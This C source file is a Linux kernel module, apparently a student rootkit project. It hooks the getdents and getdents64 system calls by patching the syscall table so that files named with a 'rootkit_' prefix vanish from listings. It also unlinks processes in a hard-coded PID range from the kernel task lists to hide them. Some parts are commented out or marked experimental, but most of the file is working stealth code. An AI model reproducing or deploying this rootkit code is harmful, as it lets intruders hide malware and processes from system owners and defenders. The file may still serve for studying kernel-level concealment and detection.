#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/init.h>      /* Custom named entry/exit function */
#include <linux/unistd.h>    /* Original read-call */
#include <asm/cacheflush.h>  /* Needed for set_memory_ro, ...*/
#include <asm/pgtable_types.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <asm/uaccess.h>
#include <linux/moduleparam.h>
#include <linux/init_task.h>
#include <linux/sched.h>

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"

/* the followin macros are taken from linux kernel source code (2.6.11)
   they probably remove a task from the task list - have to try it out */
// note that they don't seem to work in linux 2.6.32
#define REMOVE_LINKS(p) do {                                    \
        if (thread_group_leader(p))                             \
                list_del_init(&(p)->tasks);                     \
        remove_parent(p);                                       \
        } while (0)

#define SET_LINKS(p) do {                                       \
        if (thread_group_leader(p))                             \
                list_add_tail(&(p)->tasks,&init_task.tasks);    \
        add_parent(p, (p)->parent);                             \
        } while (0)


struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
                       /* length is actually (d_reclen - 2 -
                          offsetof(struct linux_dirent, d_name) */
};


// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_int_void)(void);
// for hooking the original read function
typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);
// for hooking getdents (32 and 64 bit)
typedef asmlinkage ssize_t (*fun_long_int_linux_dirent_int)(unsigned int, struct linux_dirent __user *, unsigned int);
typedef asmlinkage ssize_t (*fun_long_int_linux_dirent64_int)(unsigned int, struct linux_dirent64 __user *, unsigned int);

fun_ssize_t_int_pvoid_size_t     original_read;
fun_long_int_linux_dirent_int    original_getdents;
fun_long_int_linux_dirent64_int  original_getdents64;

static int pids_to_hide[200];
static int pids_count = 0;
module_param_array(pids_to_hide, int, &pids_count, 0000);
MODULE_PARM_DESC(pids_to_hide, "Process IDs that shall be hidden.");

// hooked functions
asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
    ssize_t retval;
    char __user* cur_buf;
    OUR_TRY_MODULE_GET;
    retval = original_read(fd, buf, count);
    cur_buf = buf;
    if (retval > 0){
        printk(KERN_INFO "%d = hooked_read(%d, %s, %d)\n", retval, fd, buf, count);
    }
    OUR_MODULE_PUT;
    return retval;
}

asmlinkage ssize_t hooked_getdents (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
    struct linux_dirent __user *cur_dirent;
    ssize_t result;
    int bpos;
    char hidename[] = "rootkit_";
    unsigned short cur_reclen;

    OUR_TRY_MODULE_GET;

    result = original_getdents(fd, dirent, count);
    OUR_DEBUG("----------------- Here are the files ------------------------------------");
    cur_dirent = dirent;

    for (bpos=0; bpos < result;){
        cur_dirent = (struct linux_dirent*)((char *)dirent + bpos);

        OUR_DEBUG("%s\n", (char*)(cur_dirent->d_name));
        if(0==memcmp(hidename, cur_dirent->d_name, strlen(hidename))) {
            OUR_DEBUG("found a file to hide:%s\n",cur_dirent->d_name);
            //printk(KERN_INFO "shift by %d from %p to %p --- result = %d\n",cur_dirent->d_reclen, cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), result);
            cur_reclen = cur_dirent->d_reclen;
            memmove(cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), (size_t)(result - bpos - cur_dirent->d_reclen));
            memset((char*)dirent + result - cur_reclen, 0, cur_reclen);
            result -= cur_reclen;
            //printk(KERN_INFO "new result = %d\n", result);
        } else {
            bpos += cur_dirent->d_reclen;
        }
    }

    OUR_DEBUG("----------------- End of file list ------------------------------------");
    OUR_MODULE_PUT
    return result;

}

asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
    struct linux_dirent64 __user *cur_dirent;
    ssize_t result;
    int bpos;
    char hidename[] = "rootkit_";
    unsigned short cur_reclen;

    OUR_TRY_MODULE_GET;

    result = original_getdents64(fd, dirent, count);
    cur_dirent = dirent;

    for (bpos=0; bpos < result;){
        cur_dirent = (struct linux_dirent64*)((char *)dirent + bpos);

        if(0==memcmp(hidename, cur_dirent->d_name, strlen(hidename))) {
            //printk(KERN_INFO "shift by %d from %p to %p --- result = %d\n",cur_dirent->d_reclen, cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), result);
            cur_reclen = cur_dirent->d_reclen;
            memmove(cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), (size_t)(result - bpos - cur_dirent->d_reclen));
            memset((char*)dirent + result - cur_reclen, 0, cur_reclen);
            result -= cur_reclen;
            //printk(KERN_INFO "new result = %d\n", result);
        } else {
            bpos += cur_dirent->d_reclen;
        }
    }

    OUR_MODULE_PUT
    return result;



}

/* Hooks the read system call. */
void hook_functions(void){
  void** sys_call_table = (void *) ptr_sys_call_table;
  // retrieve original functions
  original_read = sys_call_table[__NR_read];
  original_getdents = sys_call_table[__NR_getdents];
  original_getdents64 = sys_call_table[__NR_getdents64];
  // remove write protection
  make_page_writable((long unsigned int) ptr_sys_call_table);

  // replace function pointers! YEEEHOW!!
  //sys_call_table[__NR_read] = (void*) hooked_read;
  sys_call_table[__NR_getdents] = (void*) hooked_getdents;
  sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;
}

/* Hooks the read system call. */
void unhook_functions(void){
  void** sys_call_table = (void *) ptr_sys_call_table;
  make_page_writable((long unsigned int) ptr_sys_call_table);
  // here, we restore the original functions
  sys_call_table[__NR_read] = (void*) original_read;
  sys_call_table[__NR_getdents] = (void*) original_getdents;
  sys_call_table[__NR_getdents64] = (void*) original_getdents64;
  make_page_readonly((long unsigned int) ptr_sys_call_table);
}
/* Print the number of running processes */
int print_nr_procs(void){
    fun_int_void npf; // function pointer to function counting processes
    int res;
    npf = (fun_int_void) ptr_nr_processes;
    res = npf();
    printk(KERN_INFO "%d processes running", res);
    return 0;
}

void hide_processes_traverse_tree(struct task_struct* task){
    // traverse all children
    struct task_struct* cur;
    struct task_struct* prev;
    struct task_struct* next;
    struct list_head* p;
    OUR_DEBUG("Traversing tree (pid %d)\n", task->pid);
    list_for_each(p, &(task->children)){
        cur = list_entry(p, struct task_struct, sibling);
        prev = list_entry_rcu(cur->sibling.prev, struct task_struct, sibling);
        next = list_entry_rcu(cur->sibling.next, struct task_struct, sibling);
        prev->sibling.next = cur->sibling.next;
        next->sibling.prev = cur->sibling.prev;
        OUR_DEBUG("found pid: %d\n", cur->pid);
        if (cur != task){
            hide_processes_traverse_tree(cur);
        }
    }
}

void hide_processes(void){
    struct task_struct* task;
    struct task_struct* prev;
    struct task_struct* next;
    task = &init_task;
    prev = NULL;
    OUR_DEBUG("Now tree-traversal\n");
    hide_processes_traverse_tree(&init_task);
    OUR_DEBUG("Now manipulating task_structs...\n");
    do {
        hide_processes_traverse_tree(task);
        // the previous task (prev) is obtained by a expanded macro
        //  found in the linux kernel. it is basically the 
        //  adapted expansion of "next_task"
        prev = list_entry_rcu(task->tasks.prev, struct task_struct, tasks);
        next = next_task(task);
        if ((task->pid > 100) && (task->pid < 1000)){
            OUR_DEBUG("1 pid %d, prev->pid %d, next->pid %d\n", task->pid, prev->pid, next->pid);
            OUR_DEBUG("1 task %p, prev->next %p, next->prev %p\n", &task->tasks, prev->tasks.next, next->tasks.prev);
            OUR_DEBUG("task %p, prev %p\n", task, prev);
            OUR_DEBUG("task->next %p, prev->next %p\n", task->tasks.next, prev->tasks.next);
            // hide tasks from "global task linked list" (?!)
            prev->tasks.next = task->tasks.next;
            next->tasks.prev = task->tasks.prev;
            // hide tasks from tree-like structures
            OUR_DEBUG("2 pid %d, prev->pid %d, next->pid %d\n", task->pid, prev->pid, next->pid);
            OUR_DEBUG("2 task %p, prev->next %p, next->prev %p\n", &task->tasks, prev->tasks.next, next->tasks.prev);
        }
    } while ((task = next) != &init_task);
}

/* Initialization routine */
static int __init _init_module(void)
{
    int i;
    printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
    printk(KERN_INFO "Received %d PIDs to hide:\n", pids_count);
    for (i = 0; i < sizeof(pids_to_hide)/sizeof(int); i++) {
        printk(KERN_INFO "pids_to_hide[%d] = %d\n", i, pids_to_hide[i]);
    }

    hide_processes();
    hide_processes();

    print_nr_procs();
    hook_functions();
    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    unhook_functions();
    printk(KERN_INFO "Gruppe 6 says goodbye.\n");
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);

